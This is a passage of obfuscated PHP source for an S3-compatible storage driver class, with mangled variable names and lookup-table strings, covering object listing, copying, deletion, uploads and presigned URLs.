= $¿Ú­Ş„Ğ . "\50\60\x29{$©¨ÊÊÌè}"; for ($éÔÇÈÛì = 1; $éÔÇÈÛì <= count($­—‰ü³Ú) + 1; $éÔÇÈÛì++) { $Â³©ñÆº = $¿Ú­Ş„Ğ . "\x28{$éÔÇÈÛì}\51{$©¨ÊÊÌè}"; if (!in_array_not_case($Â³©ñÆº, $­—‰ü³Ú)) { return $Â³©ñÆº; } } return $Â³©ñÆº; } public function listAllFiles($ĞĞ¶š¢¥, $£•ÍÁ÷™) { $ç¸ĞŸ·ö =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($£•ÍÁ÷™)) { return array(); } $ÍÒ‹…’£ = array_keys($£•ÍÁ÷™); $–½äÙº¯ = array(); $ĞĞ¶š¢¥ = trim($ĞĞ¶š¢¥, $ç¸ĞŸ·ö[8]); foreach ($£•ÍÁ÷™ as $„ƒò³ĞŒ => $ä´ãâ…¼) { $ŒÚü»± = ltrim(substr(trim($„ƒò³ĞŒ, $ç¸ĞŸ·ö[8]), strlen($ĞĞ¶š¢¥)), $ç¸ĞŸ·ö[8]); if (substr($„ƒò³ĞŒ, -1) == $ç¸ĞŸ·ö[8]) { $ŒÚü»± = rtrim($ŒÚü»±, $ç¸ĞŸ·ö[8]) . $ç¸ĞŸ·ö[8]; } $–½äÙº¯ = array_merge($–½äÙº¯, $this->slicePath($ŒÚü»±)); } $°Ä“§úÌ = array(); foreach (array_unique($–½äÙº¯) as $†«–İ±) { $‰‹ù¬¤ü = array($ç¸ĞŸ·ö[87] => $this->getPathOuter($ç¸ĞŸ·ö[8] . $ĞĞ¶š¢¥ . $ç¸ĞŸ·ö[8] . $†«–İ±), $ç¸ĞŸ·ö[78] => 1, $ç¸ĞŸ·ö[79] => 0); if (substr($†«–İ±, -1) != $ç¸ĞŸ·ö[8]) { $‰‹ù¬¤ü[$ç¸ĞŸ·ö[78]] = 0; $Ó–ƒÈ•¾ = $this->getPath($ĞĞ¶š¢¥ . $ç¸ĞŸ·ö[8] . $†«–İ±); if (isset($£•ÍÁ÷™[$Ó–ƒÈ•¾])) { $šÕáæÇ¼ = $£•ÍÁ÷™[$Ó–ƒÈ•¾]; if (isset($šÕáæÇ¼[$ç¸ĞŸ·ö[79]])) { $‰‹ù¬¤ü[$ç¸ĞŸ·ö[79]] = intval($šÕáæÇ¼[$ç¸ĞŸ·ö[79]]); } if (isset($šÕáæÇ¼[$ç¸ĞŸ·ö[207]])) { $‰‹ù¬¤ü[$ç¸ĞŸ·ö[88]] = intval($šÕáæÇ¼[$ç¸ĞŸ·ö[207]]); } } } $°Ä“§úÌ[] = $‰‹ù¬¤ü; } return $°Ä“§úÌ; } public function slicePath($®Ç•Õ) { $ĞÉ‚±ºé =& $_SERVER[¼¥ÊĞÙÌ]; $à£öğ‡ = explode($ĞÉ‚±ºé[8], trim($®Ç•Õ, $ĞÉ‚±ºé[8])); $ğª”Œä = 0; do { ++$ğª”Œä; $Ø‹–¶—˜[] = implode($ĞÉ‚±ºé[8], array_slice($à£öğ‡, 0, $ğª”Œä)) . $ĞÉ‚±ºé[8]; } while ($ğª”Œä < count($à£öğ‡)); $Ø‹–¶—˜[count($à£öğ‡) - 1] = $®Ç•Õ; return $Ø‹–¶—˜; } public function getHost() { $ ê¶›ˆ÷ =& $_SERVER[¼¥ÊĞÙÌ]; $­àÌÅ¹à = parse_url(trim($this->domain, $ ê¶›ˆ÷[8])); $‘¥Îã = isset($­àÌÅ¹à[$ ê¶›ˆ÷[208]]) ? $­àÌÅ¹à[$ ê¶›ˆ÷[208]] : http_type(); $¬ë¥Ê¾è = isset($­àÌÅ¹à[$ ê¶›ˆ÷[209]]) ? $­àÌÅ¹à[$ ê¶›ˆ÷[209]] : $­àÌÅ¹à[$ ê¶›ˆ÷[87]]; if (isset($­àÌÅ¹à[$ ê¶›ˆ÷[210]])) { $¬ë¥Ê¾è .= $ ê¶›ˆ÷[4] . $­àÌÅ¹à[$ ê¶›ˆ÷[210]]; } return $‘¥Îã . $ ê¶›ˆ÷[211] . $¬ë¥Ê¾è; } public function pathEncode($Â÷‚Õô­) { $‰˜ÓÈ =& $_SERVER[¼¥ÊĞÙÌ]; return str_replace($‰˜ÓÈ[212], $‰˜ÓÈ[8], rawurlencode($Â÷‚Õô­)); } public function writeLog($­Ç’·Á· = '', $¨ŸËêè× = false) { $Ê½Í½æ‚ =& $_SERVER[¼¥ÊĞÙÌ]; $¯Ä¦ÔÈŞ = in_array(ACTION, array($Ê½Í½æ‚[213], $Ê½Í½æ‚[214])); if (!$¯Ä¦ÔÈŞ && !GLOBAL_DEBUG) { return; } $×®Àö×  = $­Ç’·Á·; static $÷­àŞã = null; if (!$÷­àŞã) { $÷­àŞã = strtoupper($this->getType()); } $­Ç’·Á· = $÷­àŞã . $Ê½Í½æ‚[215] . $­Ç’·Á·; if ($¨ŸËêè×) { $İ²§ÑîÈ = error_get_last(); if ($İ²§ÑîÈ) { $­Ç’·Á· = array($­Ç’·Á·, $İ²§ÑîÈ); } } write_log($­Ç’·Á·, $Ê½Í½æ‚[216]); if ($¯Ä¦ÔÈŞ) { throw new Exception($×®Àö× ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Ÿ™óÂ“) { set_timeout(); require_once SDK_DIR . $_SERVER[¼¥ÊĞÙÌ][217]; parent::__construct(); $this->_init($Ÿ™óÂ“); } public function _init($ÆÔ³‚®ƒ) { $ƒÁş†Ÿ =& $_SERVER[¼¥ÊĞÙÌ]; $this->config = $ÆÔ³‚®ƒ; foreach ($ÆÔ³‚®ƒ as $äîûìî± => $İîî¼Ö×) { if (isset($this->{$äîûìî±})) { $this->{$äîûìî±} = $İîî¼Ö×; } } $this->endpoint = $ÆÔ³‚®ƒ[$ƒÁş†Ÿ[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $Â¤»˜ùï = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($Â¤»˜ùï, 0, 7) == $ƒÁş†Ÿ[219]) { $Â¤»˜ùï = $ƒÁş†Ÿ[220] . substr($Â¤»˜ùï, 7); } $this->client->setEndpoint($Â¤»˜ùï); if (in_array(ACTION, array($ƒÁş†Ÿ[213], $ƒÁş†Ÿ[214]))) { $this->client->setExceptions(); } } public function setSignVersion($ÆË˜™Ÿ¼ = "\x76\64") { $this->signVer = $ÆË˜™Ÿ¼; $this->client->setSignVersion($ÆË˜™Ÿ¼); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ôŸ²ì) { return null; } } public function isBucketCors() { $èï˜÷‰â =& $_SERVER[¼¥ÊĞÙÌ]; $ŸŸê®´Ñ = $this->getBucketCors(); if (!$ŸŸê®´Ñ || !is_array($ŸŸê®´Ñ)) { return !1; } if (!is_array($ŸŸê®´Ñ[$èï˜÷‰â[221]])) { $ŸŸê®´Ñ[$èï˜÷‰â[221]] = explode($èï˜÷‰â[50], $ŸŸê®´Ñ[$èï˜÷‰â[221]]); } if ($ŸŸê®´Ñ[$èï˜÷‰â[222]] != $èï˜÷‰â[223] || !in_array($èï˜÷‰â[223], $ŸŸê®´Ñ[$èï˜÷‰â[221]])) { return !1; } $üìñ±ƒâ = array_map($èï˜÷‰â[224], $ŸŸê®´Ñ[$èï˜÷‰â[225]]); if (!is_array($üìñ±ƒâ)) { $üìñ±ƒâ = array(); } $ª–šš¥÷ = array($èï˜÷‰â[226], $èï˜÷‰â[227], $èï˜÷‰â[228], $èï˜÷‰â[229], $èï˜÷‰â[230]); $º–¨Â° = array_diff($ª–šš¥÷, $üìñ±ƒâ); return empty($º–¨Â°); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($ƒîúÊ³Ô, $ÁÑùÁó• = '', $¹–ú¨¬’ = REPEAT_RENAME) { $úşÛ‡¦¶ = $this->setContent($ƒîúÊ³Ô, $ÁÑùÁó•); if ($úşÛ‡¦¶ !== !1) { return $this->getPathOuter($ƒîúÊ³Ô); } return !1; } public function mkdir($Õ—ƒ¸¯Ş, $€æ“½Ê = REPEAT_SKIP) { $ô÷Ô®–Ë =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($Õ—ƒ¸¯Ş) && $Õ—ƒ¸¯Ş !== $ô÷Ô®–Ë[231]) { return !1; } if ($€æ“½Ê && $this->_isFolder($Õ—ƒ¸¯Ş)) { return $this->getPathOuter($Õ—ƒ¸¯Ş); } $öÓ‰…»µ = $this->setContent($Õ—ƒ¸¯Ş, $ô÷Ô®–Ë[12], !0); if ($öÓ‰…»µ !== !1) { return $this->getPathOuter($Õ—ƒ¸¯Ş); } return !1; } public function copyFile($Ñ”ª‹˜, $¹ƒïŞ‰û, $ŸÌ“ûí¯ = array()) { $›Úí»Ê =& $_SERVER[¼¥ÊĞÙÌ]; $Ÿ¶öõ‰ï = $this->objectMeta($Ñ”ª‹˜); if (!$Ÿ¶öõ‰ï) { return !1; } if ($Ÿ¶öõ‰ï[$›Úí»Ê[79]] <= 1024 * 1024 * 200) { $îç°äŠÃ = $this->client->copyObject($this->bucket, $Ñ”ª‹˜, $this->bucket, $¹ƒïŞ‰û, $›Úí»Ê[232], $ŸÌ“ûí¯); } else { $îç°äŠÃ = $this->client->multiCopyObject($this->bucket, $Ñ”ª‹˜, $this->bucket, $¹ƒïŞ‰û, $ŸÌ“ûí¯); } $îç°äŠÃ = $îç°äŠÃ ? $this->getPathOuter($¹ƒïŞ‰û) : !1; return $îç°äŠÃ; } public function moveFile($×¼ó´ş›, $Ñäê¿Íˆ) { if ($this->copyFile($×¼ó´ş›, $Ñäê¿Íˆ)) { $this->delFile($×¼ó´ş›); return $this->getPathOuter($Ñäê¿Íˆ); } return !1; } public function delFile($±§Ñã§ä) { return $this->client->deleteObject($this->bucket, $±§Ñã§ä); } public function delFolder($Æ”ìİÍã) { $Ş¾’¶£ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->exist($Æ”ìİÍã)) { return !0; } $this->listItemCache = !1; $­‹İ¾Ó¡ = $this->fileList($Æ”ìİÍã); $this->listItemCache = !0; $¯ıõ’Ùï = trim($Æ”ìİÍã, $Ş¾’¶£[8]) . $Ş¾’¶£[8]; if (!empty($Æ”ìİÍã) && $Æ”ìİÍã !== $Ş¾’¶£[231] && !in_array($¯ıõ’Ùï, $­‹İ¾Ó¡[$Ş¾’¶£[85]])) { $­‹İ¾Ó¡[$Ş¾’¶£[85]][] = $¯ıõ’Ùï; } $Ö³è÷Á… = $this->delByBatch($­‹İ¾Ó¡[$Ş¾’¶£[86]]); if (!$Ö³è÷Á…) { return !1; } $Ö³è÷Á… = $this->delByBatch($­‹İ¾Ó¡[$Ş¾’¶£[85]]); if (!$Ö³è÷Á…) { return !1; } return $this->delFile($¯ıõ’Ùï); } private function delByBatch($÷«ğ…Õ) { foreach (array_chunk($÷«ğ…Õ, 1000) as $¿ùùâƒÅ) { $©ÉÎÛ“¯ = $this->client->deleteObjects($this->bucket, $¿ùùâƒÅ); if (!$©ÉÎÛ“¯) { return !1; } } return !0; } public function rename($‹´´£Í, $ÎÈÉ‡¿ë) { return $this->renameObject($‹´´£Í, $ÎÈÉ‡¿ë); } public function listPath($ëÔÇ¢£¶, $«ğÅÎ¤ = false) { $ÏüØÑˆ =& $_SERVER[¼¥ÊĞÙÌ]; $İ£¢Ìµ­ = $this->fileList($ëÔÇ¢£¶, $ÏüØÑˆ[8], !0); foreach ($İ£¢Ìµ­[$ÏüØÑˆ[85]] as $Ê§·‡‘« => $˜°¼ŒŠÀ) { $İ£¢Ìµ­[$ÏüØÑˆ[85]][$Ê§·‡‘«] = $this->folderInfo($˜°¼ŒŠÀ, $«ğÅÎ¤, $˜°¼ŒŠÀ); } foreach ($İ£¢Ìµ­[$ÏüØÑˆ[86]] as $Ê§·‡‘« => $˜°¼ŒŠÀ) { $İ£¢Ìµ­[$ÏüØÑˆ[86]][$Ê§·‡‘«] = $this->fileInfo($˜°¼ŒŠÀ[$ÏüØÑˆ[32]], $«ğÅÎ¤, $˜°¼ŒŠÀ); } return $İ£¢Ìµ­; } protected function infoChildren($Õƒ˜ÀØ, &$Î¤Êí²˜) { $Ã‘°Ã©š =& $_SERVER[¼¥ÊĞÙÌ]; $Í©¶ôó = $this->fileList($Õƒ˜ÀØ, $Ã‘°Ã©š[12], !0); $Î¤Êí²˜[$Ã‘°Ã©š[81]] += count($Í©¶ôó[$Ã‘°Ã©š[85]]); $Î¤Êí²˜[$Ã‘°Ã©š[80]] += count($Í©¶ôó[$Ã‘°Ã©š[86]]); foreach ($Í©¶ôó[$Ã‘°Ã©š[86]] as $äÈÒ¢ü†) { if (!$äÈÒ¢ü† || !$äÈÒ¢ü†[$Ã‘°Ã©š[79]]) { continue; } $Î¤Êí²˜[$Ã‘°Ã©š[79]] += $äÈÒ¢ü†[$Ã‘°Ã©š[79]]; } } private function fileInfo($íèòÛŒ´, $‹Ûà©™Ñ = false, $‹òèÚŞ = array()) { $ëÇö„á =& $_SERVER[¼¥ÊĞÙÌ]; $‘Ü¼‰ú¬ = array($ëÇö„á[32] => $this->pathThis($íèòÛŒ´), $ëÇö„á[87] => $this->getPathOuter($íèòÛŒ´), $ëÇö„á[33] => $ëÇö„á[233], $ëÇö„á[169] => $this->ext($íèòÛŒ´), $ëÇö„á[79] => isset($‹òèÚŞ[$ëÇö„á[79]]) ? $‹òèÚŞ[$ëÇö„á[79]] : 0); if ($‹Ûà©™Ñ) { return $‘Ü¼‰ú¬; } $‘Ü¼‰ú¬[$ëÇö„á[234]] = $‘Ü¼‰ú¬[$ëÇö„á[88]] = 0; $‘Ü¼‰ú¬[$ëÇö„á[235]] = $‘Ü¼‰ú¬[$ëÇö„á[236]] = !0; if (empty($‹òèÚŞ)) { $‹òèÚŞ = $this->objectMeta($íèòÛŒ´); if (!$‹òèÚŞ) { return $‘Ü¼‰ú¬; } } if (isset($‹òèÚŞ[$ëÇö„á[237]]) && $‹òèÚŞ[$ëÇö„á[237]]) { $‘Ü¼‰ú¬[$ëÇö„á[238]] = $‹òèÚŞ[$ëÇö„á[237]]; } if (isset($‹òèÚŞ[$ëÇö„á[207]])) { $‘Ü¼‰ú¬[$ëÇö„á[88]] = $‹òèÚŞ[$ëÇö„á[207]]; } if (isset($‹òèÚŞ[$ëÇö„á[79]])) { $‘Ü¼‰ú¬[$ëÇö„á[79]] = $‹òèÚŞ[$ëÇö„á[79]]; } return $‘Ü¼‰ú¬; } private function folderInfo($»Ìûû·Ô, $Ô‚Šñ‹© = false, $ÚŸµµöù = array()) { $åÆÉ¤Ë× =& $_SERVER[¼¥ÊĞÙÌ]; $ƒĞÜÔã¼ = array($åÆÉ¤Ë×[32] => $this->pathThis($»Ìûû·Ô), $åÆÉ¤Ë×[87] => $this->getPathOuter($åÆÉ¤Ë×[8] . $»Ìûû·Ô), $åÆÉ¤Ë×[33] => $åÆÉ¤Ë×[78]); if ($Ô‚Šñ‹©) { return $ƒĞÜÔã¼; } $ƒĞÜÔã¼[$åÆÉ¤Ë×[234]] = $ƒĞÜÔã¼[$åÆÉ¤Ë×[88]] = 0; $ƒĞÜÔã¼[$åÆÉ¤Ë×[235]] = $ƒĞÜÔã¼[$åÆÉ¤Ë×[236]] = !0; if ($»Ìûû·Ô == $åÆÉ¤Ë×[12]) { return $ƒĞÜÔã¼; } if (empty($ÚŸµµöù)) { $ÚŸµµöù = $this->objectMeta(trim($»Ìûû·Ô, $åÆÉ¤Ë×[8]) . $åÆÉ¤Ë×[8]); } if (isset($ÚŸµµöù[$åÆÉ¤Ë×[207]])) { $ƒĞÜÔã¼[$åÆÉ¤Ë×[234]] = $ÚŸµµöù[$åÆÉ¤Ë×[207]]; } return $ƒĞÜÔã¼; } private function fileList($²ıÖÂú™, $æÂø¿½ = '', $—¨öÏö¹ = 0) { $ĞÔ¢ã¸å =& $_SERVER[¼¥ÊĞÙÌ]; $ÕœÅÒù = rtrim($²ıÖÂú™, $ĞÔ¢ã¸å[8]) . $ĞÔ¢ã¸å[8]; $Ë¤†ÏÍ = $this->listObjs($ÕœÅÒù, null, null, $æÂø¿½); if (!$Ë¤†ÏÍ) { return array($ĞÔ¢ã¸å[85] => array(), $ĞÔ¢ã¸å[86] => array()); } $Ûû„‹¬ = $ïùùÔ½´ = array(); foreach ($Ë¤†ÏÍ[$ĞÔ¢ã¸å[239]] as $À°´–ÄÙ) { $À¡Üîöä = $À°´–ÄÙ[$ĞÔ¢ã¸å[32]]; if ($À¡Üîöä == $ÕœÅÒù) { continue; } $äåª¶½„ = isset($À°´–ÄÙ[$ĞÔ¢ã¸å[79]]) ? $À°´–ÄÙ[$ĞÔ¢ã¸å[79]] : 0; $âÆÉ¶» = $äåª¶½„ == 0 && substr($À¡Üîöä, strlen($À¡Üîöä) - 1, 1) == $ĞÔ¢ã¸å[8] ? !0 : !1; $this->cacheMethodInfoSet($À¡Üîöä, $âÆÉ¶», $À°´–ÄÙ); if ($âÆÉ¶») { $Ûû„‹¬[] = $À¡Üîöä; continue; } $ïùùÔ½´[] = $—¨öÏö¹ ? $À°´–ÄÙ : $À¡Üîöä; } foreach ($Ë¤†ÏÍ[$ĞÔ¢ã¸å[240]] as $À°´–ÄÙ) { $Ûû„‹¬[] = $À°´–ÄÙ[$ĞÔ¢ã¸å[32]]; $this->cacheMethodInfoSet($À°´–ÄÙ[$ĞÔ¢ã¸å[32]], !0); } $this->cacheMethodInfoSet($²ıÖÂú™, !0); return array($ĞÔ¢ã¸å[85] => $Ûû„‹¬, $ĞÔ¢ã¸å[86] => $ïùùÔ½´); } private function listObjs($—ªÖ±òá, $Ï›ŸÖûî = null, $ËÂƒÊ¤ª = null, $ĞÒüª = null) { $Áã‹…è¾ =& $_SERVER[¼¥ÊĞÙÌ]; $—ªÖ±òá = trim($—ªÖ±òá, $Áã‹…è¾[8]); $æüÔÏæø = empty($—ªÖ±òá) && $—ªÖ±òá !== $Áã‹…è¾[231] ? $Áã‹…è¾[12] : $—ªÖ±òá . $Áã‹…è¾[8]; return $this->client->getBucket($this->bucket, $æüÔÏæø, $Ï›ŸÖûî, $ËÂƒÊ¤ª, $ĞÒüª, !0); } public function has($“»ô°ÃÛ, $ºß´ó§¾ = false, $Êáûåû¾ = true) { $£ø™¯œ =& $_SERVER[¼¥ÊĞÙÌ]; $“»ô°ÃÛ = trim($“»ô°ÃÛ, $£ø™¯œ[8]); $ñ²ó—æ’ = empty($“»ô°ÃÛ) && $“»ô°ÃÛ !== $£ø™¯œ[231] ? $£ø™¯œ[12] : $“»ô°ÃÛ . $£ø™¯œ[8]; $È·ïƒö = null; $ù ÖÓßğ = 500; $·äªå­§ = $£ø™¯œ[8]; $ƒÁª—Ñ = $ƒ¬Ëß–İ = array(); while (!0) { $›À¯¯Å™ = $this->listObjs($“»ô°ÃÛ, $È·ïƒö, $ù ÖÓßğ, $·äªå­§); if (!$›À¯¯Å™) { break; } $È·ïƒö = $›À¯¯Å™[$£ø™¯œ[241]]; $ËŞŒ‡¹ä = $›À¯¯Å™[$£ø™¯œ[239]]; $åâ–½Õ = $›À¯¯Å™[$£ø™¯œ[240]]; if (empty($ËŞŒ‡¹ä) && empty($åâ–½Õ)) { break; } if (count($ËŞŒ‡¹ä) == 1 && $ËŞŒ‡¹ä[0][$£ø™¯œ[32]] == $ñ²ó—æ’) { break; } if ($ºß´ó§¾) { if (count($ËŞŒ‡¹ä)) { $ËŞŒ‡¹ä = array_column($ËŞŒ‡¹ä, $£ø™¯œ[32]); $ƒÁª—Ñ = array_merge($ƒÁª—Ñ, $ËŞŒ‡¹ä); } if (count($åâ–½Õ)) { $åâ–½Õ = array_column($åâ–½Õ, $£ø™¯œ[32]); $ƒ¬Ëß–İ = array_merge($ƒ¬Ëß–İ, $åâ–½Õ); } if ($È·ïƒö === null) { break; } continue; } if ($Êáûåû¾) { if (!empty($ËŞŒ‡¹ä)) { if (count($ËŞŒ‡¹ä) > 1 || isset($ËŞŒ‡¹ä[0][$£ø™¯œ[32]]) && $ËŞŒ‡¹ä[0][$£ø™¯œ[32]] != $ñ²ó—æ’) { return !0; } } } else { if (!empty($åâ–½Õ)) { return !0; } } if ($È·ïƒö === null) { break; } } if ($ºß´ó§¾) { $ƒÁª—Ñ = array_diff($ƒÁª—Ñ, array($ñ²ó—æ’)); $ƒÁª—Ñ = count(array_unique($ƒÁª—Ñ)); $ƒ¬Ëß–İ = count(array_unique($ƒ¬Ëß–İ)); return array($£ø™¯œ[242] => $ƒÁª—Ñ, $£ø™¯œ[243] => $ƒ¬Ëß–İ); } return !1; } public function listAll($Û•îŸ†¸) { $ã¦Ø®ú„ =& $_SERVER[¼¥ÊĞÙÌ]; $úŸ‰’Ÿâ = $this->fileList($Û•îŸ†¸, $ã¦Ø®ú„[12], !0); $À£âíµ = array_to_keyvalue($úŸ‰’Ÿâ[$ã¦Ø®ú„[86]], $ã¦Ø®ú„[32]); foreach ($úŸ‰’Ÿâ[$ã¦Ø®ú„[85]] as $ºÊ¸ê¼©) { if (is_string($ºÊ¸ê¼©)) { $À£âíµ[$ºÊ¸ê¼©] = array($ã¦Ø®ú„[79] => 0); } } return $this->listAllFiles($Û•îŸ†¸, $À£âíµ); } public function canRead($ÊùÒµ¦) { $Ô‰ØçÔ’ =& $_SERVER[¼¥ÊĞÙÌ]; $ßØó°ï£ = $this->client->getAccessControlPolicy($this->bucket, $ÊùÒµ¦); if (!$ßØó°ï£) { return !1; } return in_array($ßØó°ï£, array($Ô‰ØçÔ’[244], $Ô‰ØçÔ’[245], $Ô‰ØçÔ’[246])) ? !0 : !1; } public function canWrite($ªÏæõ¦) { $‡’áÓÇü =& $_SERVER[¼¥ÊĞÙÌ]; $„”ƒıÂ = $this->client->getAccessControlPolicy($this->bucket, $ªÏæõ¦); if (!$„”ƒıÂ) { return !1; } return in_array($„”ƒıÂ, array($‡’áÓÇü[244], $‡’áÓÇü[245])) ? !0 : !1; } public function getContent($Â‹È´Âş) { return $this->client->getObject($this->bucket, $Â‹È´Âş); } public function setContent($À¿˜ÎŒ, $Üîğ¤˜¢ = '', $çèæ´ô™ = false) { $Ó×¢˜é =& $_SERVER[¼¥ÊĞÙÌ]; $À¿˜ÎŒ = $çèæ´ô™ ? trim($À¿˜ÎŒ, $Ó×¢˜é[8]) . $Ó×¢˜é[8] : $À¿˜ÎŒ; $©¬ë ‡£ = get_file_mime(get_path_ext($À¿˜ÎŒ)); $¤Ûõ¢ùå = $this->client->putObject($Üîğ¤˜¢, $this->bucket, $À¿˜ÎŒ, $Ó×¢˜é[232], array(), $©¬ë ‡£); if (!$¤Ûõ¢ùå) { return !1; } if ($çèæ´ô™) { return !0; } return $¤Ûõ¢ùå ? !0 : !1; } public function fileSubstr($ÀÖ•Å’¼, $®Ô­Èş“, $ÒûòéüÈ) { $Œö·«èì = $®Ô­Èş“ + $ÒûòéüÈ - 1; return $this->client->getObject($this->bucket, $ÀÖ•Å’¼, array($_SERVER[¼¥ÊĞÙÌ][247] => "\x62\171\x74\145\163\75{$®Ô­Èş“}\x2d{$Œö·«èì}")); } public function upload($Ïõ”³ÆÑ, $ø’İº‹«, $›Æ•ÃÔœ = false, $ğ¤·“ õ = REPEAT_REPLACE) { $˜ºéİ§¶ =& $_SERVER[¼¥ÊĞÙÌ]; $ŞÖ³ï÷ = array($˜ºéİ§¶[248] => @md5_file($ø’İº‹«)); $“à„±¯ = array($˜ºéİ§¶[249] => get_file_mime(get_path_ext($Ïõ”³ÆÑ))); if (IO::size($ø’İº‹«) <= 1024 * 1024 * 200) { $å¦ˆ“÷› = $this->client->putObjectFile($ø’İº‹«, $this->bucket, $Ïõ”³ÆÑ, $˜ºéİ§¶[232], $ŞÖ³ï÷, $“à„±¯); return !empty($å¦ˆ“÷›) ? $this->getPathOuter($Ïõ”³ÆÑ) : !1; } $Œ‚é°·ó = $this->client->multiUploadObject($ø’İº‹«, $this->bucket, trim($Ïõ”³ÆÑ, $˜ºéİ§¶[8]), $ŞÖ³ï÷, $“à„±¯); return $Œ‚é°·ó ? $this->getPathOuter($Ïõ”³ÆÑ) : !1; } public function download($½şâ¸µÚ, $ÇÖÂÑ¬•) { if (!@is_dir($this->pathFather($ÇÖÂÑ¬•)) && !IO::mkdir($this->pathFather($ÇÖÂÑ¬•))) { return !1; } $ªŒÃ—Ó¾ = $this->client->getObject($this->bucket, $½şâ¸µÚ, array(), $ÇÖÂÑ¬•); return $ªŒÃ—Ó¾ !== !1 ? $ÇÖÂÑ¬• : !1; } public function link($†‡·Ïæ, $˜ø¼äåã = array()) { return $this->getPreSignedURL($†‡·Ïæ, 3600 * 12, $˜ø¼äåã); } private function getPreSignedURL($ÒªçáŞ±, $±ıëç, $Ÿ¹ÆÇ˜° = array(), $¶ÊÈ°äİ = "\107\x45\124") { $ÜõåŞéû =& $_SERVER[¼¥ÊĞÙÌ]; $ÒªçáŞ± = trim($ÒªçáŞ±, $ÜõåŞéû[8]); if ($this->signVer == $ÜõåŞéû[250]) { return $this->client->getPreSignedV2URL($this->bucket, $ÒªçáŞ±, $±ıëç, $¶ÊÈ°äİ, $Ÿ¹ÆÇ˜°); } return $this->client->getPreSignedV4URL($this->bucket, $ÒªçáŞ±, $±ıëç, array(), $¶ÊÈ°äİ, $Ÿ¹ÆÇ˜°); } public function fileOut($«Ö…âú, $ğî¿ÚÔ = false, $İÑ¹š· = false, $‡éÑÊéÖ = '') { $ßÒù†¦Ş =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->isFileOutServer()) { return $this->fileOutServer($«Ö…âú, $ğî¿ÚÔ, $İÑ¹š·, $‡éÑÊéÖ); } if (!$İÑ¹š·) { $İÑ¹š· = $this->pathThis($«Ö…âú); } $‚ë¨ßıÙ = get_file_mime(get_path_ext($İÑ¹š·)); if ($‚ë¨ßıÙ == $ßÒù†¦Ş[251]) { return parent::fileOut($«Ö…âú, $ğî¿ÚÔ, $İÑ¹š·, $‡éÑÊéÖ); } $”ß…« = array($ßÒù†¦Ş[252] => $‚ë¨ßıÙ); if ($ğî¿ÚÔ) { $”ß…«[$ßÒù†¦Ş[253]] = $ßÒù†¦Ş[254] . rawurlencode($İÑ¹š·); } else { } $×†ÙÔàÀ = $this->link($«Ö…âú, $”ß…«); $this->fileOutLink($×†ÙÔàÀ); } public function fileOutServer($õ¶Ş˜¥, $«¡´ÑÒ = false, $áÊµ€º = false, $±Òªá™¸ = '') { parent::fileOut($õ¶Ş˜¥, $«¡´ÑÒ, $áÊµ€º, $±Òªá™¸); } public function fileOutImageServer($÷²ê£×Î, $ÛÚ‡Âîá = 250) { parent::fileOutImage($÷²ê£×Î, $ÛÚ‡Âîá); } public function fileOutLink($©ñ¨óğÕ) { $¶ïúÕ½± =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($¶ïúÕ½±[67], $¶ïúÕ½±[66], $¶ïúÕ½±[68])) && !get_url_scheme($this->endpoint) && substr($©ñ¨óğÕ, 0, 7) == $¶ïúÕ½±[219]) { $©ñ¨óğÕ = $¶ïúÕ½±[220] . substr($©ñ¨óğÕ, 7); } header($¶ïúÕ½±[175] . $©ñ¨óğÕ); die; } public function hashMd5($ÒÉ‡¹â‚, $‰†¬á = '') { $È ÂíûÖ = $this->objectMeta($ÒÉ‡¹â‚); if (!$È ÂíûÖ) { return !1; } $‰†¬á = $‰†¬á ? $‰†¬á : _get($È ÂíûÖ, $_SERVER[¼¥ÊĞÙÌ][255]); return $‰†¬á; } public function uploadFormData($üé¬şÃá, $äã°¦ï = 3600) { $íİ´Àî÷ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->_isClientAsync()) { $ÏÓ‰ı–â = $this->getPreSignedURL($üé¬şÃá, $äã°¦ï, array(), $íİ´Àî÷[256]); return array($íİ´Àî÷[209] => str_replace($íİ´Àî÷[219], $íİ´Àî÷[257], $ÏÓ‰ı–â)); } if (isset($GLOBALS[$íİ´Àî÷[6]][$íİ´Àî÷[92]][$íİ´Àî÷[258]]) && $GLOBALS[$íİ´Àî÷[6]][$íİ´Àî÷[92]][$íİ´Àî÷[258]] == $íİ´Àî÷[231]) { return $this->uploadMultiData($üé¬şÃá, $äã°¦ï); } if ($this->signVer == $íİ´Àî÷[250]) { return $this->uploadFormDataV2($üé¬şÃá, $äã°¦ï); } return $this->uploadFormDataV4($üé¬şÃá, $äã°¦ï); } public function uploadFormDataV2($óéÎê©, $‚êò¸–Î = 3600) { $„©Û¢–ˆ =& $_SERVER[¼¥ÊĞÙÌ]; $µ»©É“£ = $this->pathFather($óéÎê©); $”©éº°Œ = $this->client->getHttpUploadPostParams($this->bucket, $µ»©É“£, $„©Û¢–ˆ[232], $‚êò¸–Î); $³’…Ëè– = array_merge((array) $”©éº°Œ, array($„©Û¢–ˆ[259] => $„©Û¢–ˆ[250], $„©Û¢–ˆ[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($³’…Ëè–[$„©Û¢–ˆ[259]]); } return $³’…Ëè–; } public function uploadFormDataV4($¦è‰¢•ñ, $ãèñˆç = 3600) { $çØ‡êÃ¯ =& $_SERVER[¼¥ÊĞÙÌ]; $Ò€ÁÊÆ“ = $çØ‡êÃ¯[232]; $îÔ¼ßŞõ = $çØ‡êÃ¯[260]; $èÀ‚™í¼ = $çØ‡êÃ¯[62]; $·–®à¾Ë = gmdate($çØ‡êÃ¯[261]); $„‚Ï‰ëä = 